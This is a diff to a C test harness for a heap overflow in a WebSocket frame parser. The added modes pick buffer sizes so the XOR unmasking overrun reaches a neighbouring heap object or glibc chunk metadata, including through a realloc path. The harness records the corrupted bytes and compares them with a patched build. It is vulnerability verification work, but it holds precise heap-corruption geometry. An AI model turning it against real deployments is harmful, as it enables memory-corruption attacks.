@@ -174,7 +174,24 @@ int main(int argc, char **argv)
     int safe = (strcmp(mode, "safe") == 0);
     int do_abort = (strcmp(mode, "abort") == 0);
     int do_victim = (strcmp(mode, "victim") == 0);
+    int do_geom = (strcmp(mode, "geom") == 0);
+    int do_realloc = (strcmp(mode, "realloc") == 0);
+    size_t bbuflen = BBUF_LEN;
     size_t payload_len = safe ? PAYLOAD_LEN_SHORT : PAYLOAD_LEN_FULL;
+    if (do_geom) {
+        /* 65527 = 7 (mod 16): glibc hands back only N+1 usable bytes, so
+         * the 14-byte extent reaches the next chunk's user data. */
+        bbuflen = argc > 2 ? (size_t)strtoul(argv[2], NULL, 10) : 65527;
+        payload_len = bbuflen;
+        do_victim = 1;
+    }
+    if (do_realloc) {
+        /* Default 64 KiB ws_init bbuffer; 65544-byte frame makes the real
+         * ws.c:1057 realloc fire (need+blen > bbuflen) and leaves 14 bytes
+         * past the new rplen, 6 of them inside the next chunk's user data. */
+        payload_len = 65544;
+        do_victim = 1;
+    }
     const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };
     wsh_t *wsh;
     ws_opcode_t oc = WSOC_CONTINUATION;
@@ -182,6 +199,7 @@ int main(int argc, char **argv)
     ssize_t rv;
     int cli_fd;
     size_t usable;
+    size_t snap_off = 0, eff_len = 0;
 #ifdef PLAIN_MODE
     uint8_t snap[48], after[48];
     uint8_t *victim = NULL;
@@ -204,10 +222,10 @@ int main(int argc, char **argv)
     wsh->buflen = BBUF_LEN;
     wsh->buffer = (char *)malloc(wsh->buflen);          /* ws_init: line 743 */
 #ifdef PIN_FIXED
-    wsh->bbuflen = BBUF_LEN;
+    wsh->bbuflen = bbuflen;
     wsh->bbuffer = (char *)malloc(wsh->bbuflen + 1);    /* fixed ws_init: +1 slot */
 #else
-    wsh->bbuflen = BBUF_LEN;
+    wsh->bbuflen = bbuflen;
     wsh->bbuffer = (char *)malloc(wsh->bbuflen);        /* vuln ws_init: line 744 */
 #endif
     if (!wsh->buffer || !wsh->bbuffer) return 2;
@@ -217,16 +235,17 @@ int main(int argc, char **argv)
     wsh->body = wsh->bbuffer;
 
     usable = malloc_usable_size(wsh->bbuffer);
+    snap_off = wsh->bbuflen;
+    char *orig_bbuffer = wsh->bbuffer;
 
 #ifdef PLAIN_MODE
-    /* Snapshot 48 bytes starting at the requested bbuffer boundary. These
-     * are the bytes the 14-byte XOR extent (offsets 65536..65549) and the
-     * NUL (offset 65536) can reach on a natural glibc layout. */
-    memcpy(snap, wsh->bbuffer + BBUF_LEN, sizeof(snap));
+    /* Snapshot 48 bytes starting at the pre-call requested bbuffer boundary;
+     * in the realloc case the library grows bbuflen during the call. */
+    memcpy(snap, wsh->bbuffer + snap_off, sizeof(snap));
     if (do_victim) {
         victim = (uint8_t *)malloc(128);
         memset(victim, 0xC3, 128);
-        memcpy(snap, wsh->bbuffer + BBUF_LEN, sizeof(snap));
+        memcpy(snap, wsh->bbuffer + snap_off, sizeof(snap));
         memcpy(vsnap, victim, sizeof(vsnap));
         memcpy(vsize, victim - 8, sizeof(vsize));
         fprintf(stderr, "VICTIM_OFF=%zd VICTIM_SIZE_BEFORE=",
@@ -241,11 +260,12 @@ int main(int argc, char **argv)
             mask[0], mask[1], mask[2], mask[3]);
 
     rv = ws_read_frame(wsh, &oc, &data);
+    eff_len = wsh->bbuflen;
 
 #ifdef PLAIN_MODE
     /* Capture the post-frame bytes into stack immediately: any printf or
      * malloc here would perturb the very heap metadata being measured. */
-    memcpy(after, wsh->bbuffer + BBUF_LEN, sizeof(after));
+    memcpy(after, wsh->bbuffer + snap_off, sizeof(after));
     if (victim) {
         fprintf(stderr, "VICTIM_DATA_BEFORE=");
         for (k = 0; k < 8; k++) fprintf(stderr, "%02x", vsnap[k]);
@@ -264,24 +284,33 @@ int main(int argc, char **argv)
 #ifdef PLAIN_MODE
     {
         int bad = 0;
+        size_t delta_off = eff_len >= snap_off ? eff_len - snap_off : 0;
+        fprintf(stderr, "SNAP_OFF=%zu EFF_LEN=%zu\n", snap_off, eff_len);
         fprintf(stderr, "BEFORE");
         for (k = 0; k < sizeof(snap); k++) fprintf(stderr, " %02x", snap[k]);
         fprintf(stderr, "\nAFTER ");
         for (k = 0; k < sizeof(snap); k++) fprintf(stderr, " %02x", after[k]);
         fprintf(stderr, "\n");
-        /* At the natural layout, offsets +0..+7 are the next chunk's
-         * prev_size (inside malloc's 65544 usable space); offsets +8..+13
-         * are the low 6 bytes of the next chunk's size field. */
-        fprintf(stderr, "META_OFF=+8 NEXT_SIZE_BEFORE=");
-        for (k = 8; k < 16; k++) fprintf(stderr, "%02x", snap[k]);
-        fprintf(stderr, " NEXT_SIZE_AFTER=");
-        for (k = 8; k < 16; k++) fprintf(stderr, "%02x", after[k]);
-        fprintf(stderr, "\n");
+        /* Snapshot offsets are relative to the pre-call bbuffer boundary;
+         * the next chunk's size field starts at malloc_usable_size(). */
+        {
+            size_t meta_off = usable >= snap_off ? usable - snap_off : 0;
+            fprintf(stderr, "META_OFF=+%zu NEXT_SIZE_BEFORE=", meta_off);
+            for (k = meta_off; k < meta_off + 8; k++) fprintf(stderr, "%02x", snap[k]);
+            fprintf(stderr, " NEXT_SIZE_AFTER=");
+            for (k = meta_off; k < meta_off + 8; k++) fprintf(stderr, "%02x", after[k]);
+            fprintf(stderr, "\n");
+        }
 #if defined(PIN_FIXED)
-        /* Fixed pin: +1 slot absorbs the NUL; the loop is rplen-bounded. */
-        for (k = 0; k < sizeof(snap); k++)
-            if (after[k] != snap[k]) bad = 1;
-        fprintf(stderr, "CONTROL=FIXED_PIN_UNTOUCHED\n");
+        /* Fixed pin: +1 slot can make realloc move the buffer; the live
+         * victim object check below is then the meaningful control. */
+        if (do_realloc && wsh->bbuffer != orig_bbuffer) {
+            fprintf(stderr, "CONTROL=FIXED_PIN_REALLOC_MOVED SNAPSHOT_VALID=0\n");
+        } else {
+            for (k = 0; k < sizeof(snap); k++)
+                if (after[k] != snap[k]) bad = 1;
+            fprintf(stderr, "CONTROL=FIXED_PIN_UNTOUCHED SNAPSHOT_VALID=1\n");
+        }
 #else
         if (safe) {
             /* Short frame: XOR stays inside the 64 KiB allocation. */
@@ -290,13 +319,33 @@ int main(int argc, char **argv)
             fprintf(stderr, "CONTROL=SHORT_FRAME_UNTOUCHED\n");
         } else {
             for (k = 1; k <= 13; k++) {
-                uint8_t expect = (uint8_t)(snap[k] ^ mask[k % 4]);
-                if (after[k] != expect) bad = 1;
+                uint8_t expect = (uint8_t)(snap[delta_off + k] ^ mask[(eff_len + k) % 4]);
+                if (after[delta_off + k] != expect) bad = 1;
             }
-            if (after[0] != 0x00u) bad = 1;
+            if (after[delta_off] != 0x00u) bad = 1;
         }
 #endif
-        fprintf(stderr, "XOR_DELTA_BAD=%d NUL=%02x\n", bad, after[0]);
+        fprintf(stderr, "XOR_DELTA_BAD=%d NUL=%02x\n", bad, after[delta_off]);
+        if ((do_geom || do_realloc) && victim) {
+            ptrdiff_t voff = victim - (uint8_t *)wsh->bbuffer;
+            size_t first = usable + 8 > eff_len ? usable + 8 - eff_len : 0;
+            size_t nbytes = first < 14 ? 14 - first : 0;
+            int vbad = 0;
+            fprintf(stderr, "GEOM_VOFF=%td GEOM_FIRST=%zu GEOM_NBYTES=%zu\n",
+                    voff, first, nbytes);
+#ifdef PIN_FIXED
+            for (k = 0; k < nbytes && k < sizeof(vsnap); k++)
+                if (victim[k] != vsnap[k]) vbad = 1;
+            fprintf(stderr, "GEOM_VICTIM_UNTOUCHED=%d\n", vbad == 0);
+#else
+            for (k = 0; k < nbytes && k < sizeof(vsnap); k++) {
+                uint8_t expect = (uint8_t)(vsnap[k] ^ mask[(bbuflen + first + k) % 4]);
+                if (victim[k] != expect) vbad = 1;
+            }
+            fprintf(stderr, "GEOM_VICTIM_DELTA_BAD=%d\n", vbad);
+#endif
+            bad |= vbad;
+        }
         if (do_abort) {
             void *p = malloc(64);
             fprintf(stderr, "POST_MALLOC_PTR=%p\n", p);
